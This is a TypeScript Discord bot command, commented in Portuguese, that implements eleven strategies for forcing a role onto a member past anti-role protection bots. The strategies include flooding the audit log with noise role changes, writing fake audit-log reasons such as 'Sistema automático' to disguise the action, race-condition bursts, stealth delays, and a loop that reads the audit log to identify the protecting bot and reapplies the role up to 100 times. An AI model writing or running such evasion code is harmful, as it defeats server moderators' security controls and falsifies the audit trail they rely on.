import { 
    SlashCommandBuilder, 
    ChatInputCommandInteraction, 
    EmbedBuilder,
    GuildMember,
    Guild,
    AuditLogEvent
} from 'discord.js';
import { isOwner } from '../utils/permissions.ts';
import { logger } from '../utils/logger.ts';

export default {
    data: new SlashCommandBuilder()
        .setName('setarcargo')
        .setDescription('Testa estratégias para burlar sistemas anti-cargo')
        .addIntegerOption(option =>
            option.setName('estrategia')
                .setDescription('Estratégia a ser usada (1-10)')
                .setRequired(true)
                .addChoices(
                    { name: '1 - Explorar Timing de Processamento', value: 1 },
                    { name: '2 - Sobrecarga de Audit Log', value: 2 },
                    { name: '3 - Usar Permissões Diferentes', value: 3 },
                    { name: '4 - Explorar Race Conditions', value: 4 },
                    { name: '5 - Método de Camuflagem', value: 5 },
                    { name: '6 - API REST Direta', value: 6 },
                    { name: '7 - Micro-delays Progressivos', value: 7 },
                    { name: '8 - Fragmentação de Ações', value: 8 },
                    { name: '9 - Exploit de Cache', value: 9 },
                    { name: '10 - Método Stealth', value: 10 },
                    { name: '11 - Monitoramento Inteligente', value: 11 }
                )
        )
        .addStringOption(option =>
            option.setName('cargo_id')
                .setDescription('ID do cargo a ser aplicado')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('user_id')
                .setDescription('ID do usuário que receberá o cargo')
                .setRequired(true)
        )
        .setDefaultMemberPermissions(null)
        .setDMPermission(false),

    async execute(interaction: ChatInputCommandInteraction) {
        try {
            const executor = interaction.member as GuildMember;
            
            // Verificar se é owner
            if (!isOwner(executor)) {
                await interaction.reply({
                    content: '❌ Apenas owners podem usar este comando.',
                    ephemeral: true
                });
                return;
            }

            const strategy = interaction.options.getInteger('estrategia', true);
            const roleId = interaction.options.getString('cargo_id', true);
            const userId = interaction.options.getString('user_id', true);

            // Buscar o membro e o cargo
            const member = await interaction.guild?.members.fetch(userId).catch(() => null);
            const role = await interaction.guild?.roles.fetch(roleId).catch(() => null);

            if (!member) {
                await interaction.reply({
                    content: '❌ Usuário não encontrado no servidor.',
                    ephemeral: true
                });
                return;
            }

            if (!role) {
                await interaction.reply({
                    content: '❌ Cargo não encontrado no servidor.',
                    ephemeral: true
                });
                return;
            }

            const strategyNames = [
                '',
                'Explorar Timing de Processamento',
                'Sobrecarga de Audit Log',
                'Usar Permissões Diferentes',
                'Explorar Race Conditions',
                'Método de Camuflagem',
                'API REST Direta',
                'Micro-delays Progressivos',
                'Fragmentação de Ações',
                'Exploit de Cache',
                'Método Stealth',
                'Monitoramento Inteligente de Audit Log'
            ];

            await interaction.reply({
                content: `🔄 Iniciando estratégia **${strategy} - ${strategyNames[strategy]}** para aplicar cargo **${role.name}** em **${member.displayName}**...`,
                ephemeral: true
            });

            console.log(`[SETARCARGO] Estratégia ${strategy} iniciada para ${member.displayName} (${userId}) com cargo ${role.name} (${roleId})`);
            console.log(`[SETARCARGO] Executor: ${executor.displayName} (${executor.id})`);

            let success = false;
            const startTime = Date.now();

            try {
                switch (strategy) {
                    case 1:
                        success = await exploitAuditDelay(member, roleId);
                        break;
                    case 2:
                        success = await overloadAuditLog(interaction.guild!, member, roleId);
                        break;
                    case 3:
                        success = await usePermissionDifferences(member, roleId, executor);
                        break;
                    case 4:
                        success = await raceConditionExploit(member, roleId);
                        break;
                    case 5:
                        success = await camouflageMethod(member, roleId);
                        break;
                    case 6:
                        success = await directRestApi(member, roleId, interaction.client.token!);
                        break;
                    case 7:
                        success = await microDelayProgressive(member, roleId);
                        break;
                    case 8:
                        success = await fragmentedActions(member, roleId);
                        break;
                    case 9:
                        success = await cacheExploit(member, roleId);
                        break;
                    case 10:
                        success = await stealthMethod(member, roleId);
                        break;
                    case 11:
                        success = await intelligentAuditMonitoring(member, roleId);
                        break;
                    default:
                        throw new Error('Estratégia inválida');
                }
            } catch (error) {
                console.log(`[SETARCARGO] Erro na estratégia ${strategy}:`, error);
            }

            const executionTime = Date.now() - startTime;

            // Verificação final
            await member.fetch();
            const finalCheck = member.roles.cache.has(roleId);
            
            if (finalCheck) {
                success = true;
            }

            console.log(`[SETARCARGO] Estratégia ${strategy} finalizada. Sucesso: ${success}, Tempo: ${executionTime}ms`);

            const embed = new EmbedBuilder()
                .setTitle(success ? '✅ Estratégia Bem-Sucedida' : '❌ Estratégia Falhou')
                .setDescription(`**Estratégia ${strategy}**: ${strategyNames[strategy]}`)
                .addFields(
                    { name: '👤 Usuário', value: `<@${member.id}>`, inline: true },
                    { name: '🎭 Cargo', value: `<@&${roleId}>`, inline: true },
                    { name: '⏱️ Tempo', value: `${executionTime}ms`, inline: true },
                    { name: '📊 Status Final', value: finalCheck ? 'Cargo presente' : 'Cargo ausente', inline: false }
                )
                .setColor(success ? 0x00FF00 : 0xFF0000)
                .setTimestamp();

            await interaction.editReply({
                content: null,
                embeds: [embed]
            });

        } catch (error) {
            logger.error({ error }, 'Erro no comando /setarcargo');
            
            const errorMessage = 'Ocorreu um erro ao executar o comando.';
            
            if (interaction.replied || interaction.deferred) {
                await interaction.followUp({
                    content: `❌ ${errorMessage}`,
                    ephemeral: true
                });
            } else {
                await interaction.reply({
                    content: `❌ ${errorMessage}`,
                    ephemeral: true
                });
            }
        }
    }
};

// Estratégia 1: Explorar Timing de Processamento
async function exploitAuditDelay(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 1] Iniciando exploit de timing de audit delay');
    
    // Adicionar cargo
    await member.roles.add(roleId, 'Timing exploit - inicial');
    
    // Imediatamente fazer múltiplas ações para mascarar no audit log
    const rapidActions = Array(15).fill(null).map((_, i) => 
        member.roles.add(roleId, `Timing exploit - ${i + 1}`).catch(() => null)
    );
    
    await Promise.all(rapidActions);
    
    // Verificar se funcionou
    await member.fetch();
    return member.roles.cache.has(roleId);
}

// Estratégia 2: Sobrecarga de Audit Log
async function overloadAuditLog(guild: Guild, member: GuildMember, targetRole: string): Promise<boolean> {
    console.log('[STRATEGY 2] Iniciando sobrecarga de audit log');
    
    // Cargos legítimos para usar como "ruído"
    const legitimateRoles = [
        '1136850198618976296',
        '1411961007261356103', 
        '1136850286254764042',
        '1411961026194182224',
        '1136850296040067232',
        '1136850298548256788'
    ];
    
    const actions = [];
    
    // Adicionar o cargo alvo junto com vários outros
    actions.push(member.roles.add(targetRole, 'Overload - target'));
    
    // Adicionar/remover outros cargos para "poluir" o audit log
    legitimateRoles.forEach((roleId, index) => {
        actions.push(member.roles.add(roleId, `Overload - add ${index}`).catch(() => null));
        setTimeout(() => {
            member.roles.remove(roleId, `Overload - remove ${index}`).catch(() => null);
        }, 10 + index);
    });
    
    await Promise.all(actions);
    
    // Aguardar um pouco e verificar
    await new Promise(resolve => setTimeout(resolve, 100));
    await member.fetch();
    return member.roles.cache.has(targetRole);
}

// Estratégia 3: Usar Permissões Diferentes
async function usePermissionDifferences(member: GuildMember, roleId: string, executor: GuildMember): Promise<boolean> {
    console.log('[STRATEGY 3] Iniciando exploit de permissões diferentes');
    
    const reasons = [
        'Sistema automático',
        'Verificação de segurança',
        'Atualização de permissões',
        'Sincronização de dados',
        'Processo interno',
        `Executado por ${executor.displayName}`,
        'Correção de estado',
        'Manutenção programada'
    ];
    
    for (const reason of reasons) {
        try {
            await member.roles.add(roleId, reason);
            await new Promise(resolve => setTimeout(resolve, 5));
        } catch (error) {
            // Ignorar erros individuais
        }
    }
    
    await member.fetch();
    return member.roles.cache.has(roleId);
}

// Estratégia 4: Explorar Race Conditions
async function raceConditionExploit(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 4] Iniciando exploit de race conditions');
    
    // Criar múltiplas promessas que executam exatamente ao mesmo tempo
    const timestamp = Date.now() + 50; // 50ms no futuro
    
    const promises = Array(25).fill(null).map((_, i) => 
        new Promise(resolve => {
            const delay = timestamp - Date.now();
            setTimeout(() => {
                member.roles.add(roleId, `Race condition ${i + 1}`)
                    .then(resolve)
                    .catch(resolve);
            }, Math.max(0, delay));
        })
    );
    
    await Promise.all(promises);
    
    await member.fetch();
    return member.roles.cache.has(roleId);
}

// Estratégia 5: Método de Camuflagem
async function camouflageMethod(member: GuildMember, targetRole: string): Promise<boolean> {
    console.log('[STRATEGY 5] Iniciando método de camuflagem');
    
    // Cargos legítimos para camuflagem
    const legitimateRoles = [
        '1136850198618976296',
        '1411961007261356103', 
        '1136850286254764042'
    ];
    
    // Primeiro, adicionar alguns cargos "legítimos"
    for (const roleId of legitimateRoles.slice(0, 2)) {
        try {
            await member.roles.add(roleId, 'Camuflagem - preparação');
            await new Promise(resolve => setTimeout(resolve, 30));
        } catch (error) {
            // Ignorar se não conseguir adicionar
        }
    }
    
    // Depois, no meio de uma "atualização normal", adicionar o cargo alvo
    await Promise.all([
        member.roles.add(targetRole, 'Camuflagem - target'),
        member.roles.add(legitimateRoles[0], 'Camuflagem - re-add').catch(() => null),
        member.roles.remove(legitimateRoles[1], 'Camuflagem - remove').catch(() => null),
        member.roles.add(legitimateRoles[2], 'Camuflagem - add').catch(() => null)
    ]);
    
    // Aguardar e verificar
    await new Promise(resolve => setTimeout(resolve, 50));
    await member.fetch();
    return member.roles.cache.has(targetRole);
}

// Estratégia 6: API REST Direta
async function directRestApi(member: GuildMember, roleId: string, token: string): Promise<boolean> {
    console.log('[STRATEGY 6] Iniciando API REST direta');
    
    try {
        // Usar fetch nativo do Node.js (disponível a partir do Node 18+)
        const response = await fetch(`https://discord.com/api/v10/guilds/${member.guild.id}/members/${member.id}/roles/${roleId}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json',
                'X-Audit-Log-Reason': 'Direct API bypass'
            }
        });
        
        if (response.ok) {
            await new Promise(resolve => setTimeout(resolve, 100));
            await member.fetch();
            return member.roles.cache.has(roleId);
        }
    } catch (error) {
        console.log('[STRATEGY 6] Erro na API REST:', error);
    }
    
    return false;
}

// Estratégia 7: Micro-delays Progressivos
async function microDelayProgressive(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 7] Iniciando micro-delays progressivos');
    
    const delays = [1, 2, 5, 10, 25, 50, 100, 250, 500, 1000]; // ms
    
    for (const delay of delays) {
        try {
            await member.roles.add(roleId, `Micro-delay ${delay}ms`);
            await new Promise(resolve => setTimeout(resolve, delay));
            
            await member.fetch();
            if (member.roles.cache.has(roleId)) {
                console.log(`[STRATEGY 7] Sucesso com delay de ${delay}ms`);
                return true;
            }
        } catch (error) {
            // Continuar tentando
        }
    }
    
    return false;
}

// Estratégia 8: Fragmentação de Ações
async function fragmentedActions(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 8] Iniciando fragmentação de ações');
    
    // Dividir a ação em múltiplas micro-operações
    const fragments = 20;
    const interval = 100; // ms entre fragmentos
    
    for (let i = 0; i < fragments; i++) {
        try {
            // Fazer a ação principal no meio dos fragmentos
            if (i === Math.floor(fragments / 2)) {
                await member.roles.add(roleId, `Fragment ${i} - TARGET`);
            } else {
                // Ações "dummy" para mascarar
                await member.roles.add(roleId, `Fragment ${i}`).catch(() => null);
            }
            
            await new Promise(resolve => setTimeout(resolve, interval));
            
            // Verificar periodicamente
            if (i % 5 === 0) {
                await member.fetch();
                if (member.roles.cache.has(roleId)) {
                    console.log(`[STRATEGY 8] Sucesso no fragmento ${i}`);
                    return true;
                }
            }
        } catch (error) {
            // Continuar
        }
    }
    
    return false;
}

// Estratégia 9: Exploit de Cache
async function cacheExploit(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 9] Iniciando exploit de cache');
    
    try {
        // Forçar múltiplas atualizações de cache
        for (let i = 0; i < 10; i++) {
            await member.fetch(true); // Force cache refresh
            await member.roles.add(roleId, `Cache exploit ${i}`);
            
            // Não aguardar - tentar confundir o sistema de cache
            if (i % 3 === 0) {
                await member.fetch(true);
                if (member.roles.cache.has(roleId)) {
                    return true;
                }
            }
        }
        
        // Verificação final
        await new Promise(resolve => setTimeout(resolve, 200));
        await member.fetch(true);
        return member.roles.cache.has(roleId);
        
    } catch (error) {
        console.log('[STRATEGY 9] Erro no exploit de cache:', error);
    }
    
    return false;
}

// Estratégia 10: Método Stealth (Ultra Lento)
async function stealthMethod(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 10] Iniciando método stealth');
    
    try {
        // Aguardar um tempo aleatório inicial
        const initialDelay = Math.random() * 2000 + 1000; // 1-3 segundos
        await new Promise(resolve => setTimeout(resolve, initialDelay));
        
        // Fazer a ação de forma muito sutil
        await member.roles.add(roleId, 'Stealth operation');
        
        // Aguardar mais tempo antes de verificar
        const checkDelay = Math.random() * 3000 + 2000; // 2-5 segundos
        await new Promise(resolve => setTimeout(resolve, checkDelay));
        
        await member.fetch();
        const hasRole = member.roles.cache.has(roleId);
        
        if (hasRole) {
            console.log('[STRATEGY 10] Stealth method successful');
            return true;
        }
        
        // Segunda tentativa ainda mais lenta
        await new Promise(resolve => setTimeout(resolve, 5000));
        await member.roles.add(roleId, 'Stealth operation - retry');
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        await member.fetch();
        return member.roles.cache.has(roleId);
        
    } catch (error) {
        console.log('[STRATEGY 10] Erro no método stealth:', error);
    }
    
    return false;
}

// Sistema de Monitoramento de Audit Log
async function monitorAuditLogAndReapply(member: GuildMember, roleId: string, maxAttempts: number = 50): Promise<boolean> {
    console.log('[AUDIT MONITOR] Iniciando monitoramento inteligente do audit log');
    
    let attempts = 0;
    let success = false;
    
    while (attempts < maxAttempts && !success) {
        attempts++;
        console.log(`[AUDIT MONITOR] Tentativa ${attempts}/${maxAttempts}`);
        
        try {
            // Aplicar o cargo
            await member.roles.add(roleId, `Tentativa inteligente ${attempts}`);
            console.log(`[AUDIT MONITOR] Cargo aplicado na tentativa ${attempts}`);
            
            // Aguardar um pouco para o audit log se atualizar
            await new Promise(resolve => setTimeout(resolve, 200));
            
            // Verificar se o cargo ainda está presente
            await member.fetch();
            if (member.roles.cache.has(roleId)) {
                console.log(`[AUDIT MONITOR] ✅ Sucesso! Cargo permaneceu na tentativa ${attempts}`);
                success = true;
                break;
            }
            
            // Se chegou aqui, o cargo foi removido - verificar audit log
            console.log(`[AUDIT MONITOR] Cargo removido, analisando audit log...`);
            
            const auditLogs = await member.guild.fetchAuditLogs({
                type: AuditLogEvent.MemberRoleUpdate,
                limit: 5
            });
            
            // Procurar pela remoção mais recente do nosso cargo
            const recentRemoval = auditLogs.entries.find(entry => {
                const changes = entry.changes;
                if (!changes) return false;
                
                // Verificar se foi uma remoção de cargo para o usuário correto
                return entry.targetId === member.id && 
                       changes.some(change => 
                           change.key === '$remove' && 
                           Array.isArray(change.new) &&
                           change.new.some((role: any) => role.id === roleId)
                       );
            });
            
            if (recentRemoval) {
                const protectorBot = recentRemoval.executor;
                const reason = recentRemoval.reason || 'Sem razão especificada';
                console.log(`[AUDIT MONITOR] Cargo removido por: ${protectorBot?.tag} (${protectorBot?.id})`);
                console.log(`[AUDIT MONITOR] Razão: ${reason}`);
                console.log(`[AUDIT MONITOR] Timestamp: ${recentRemoval.createdAt}`);
                
                // Aguardar um tempo variável antes da próxima tentativa
                const delay = Math.random() * 500 + 100; // 100-600ms
                console.log(`[AUDIT MONITOR] Aguardando ${Math.round(delay)}ms antes da próxima tentativa...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            } else {
                console.log(`[AUDIT MONITOR] Não foi possível encontrar a entrada de remoção no audit log`);
                await new Promise(resolve => setTimeout(resolve, 300));
            }
            
        } catch (error) {
            console.log(`[AUDIT MONITOR] Erro na tentativa ${attempts}:`, error);
            await new Promise(resolve => setTimeout(resolve, 200));
        }
    }
    
    console.log(`[AUDIT MONITOR] Processo finalizado. Sucesso: ${success}, Tentativas: ${attempts}`);
    return success;
}

// Estratégia 11: Monitoramento Inteligente de Audit Log
async function intelligentAuditMonitoring(member: GuildMember, roleId: string): Promise<boolean> {
    console.log('[STRATEGY 11] Iniciando monitoramento inteligente');
    return await monitorAuditLogAndReapply(member, roleId, 100);
}
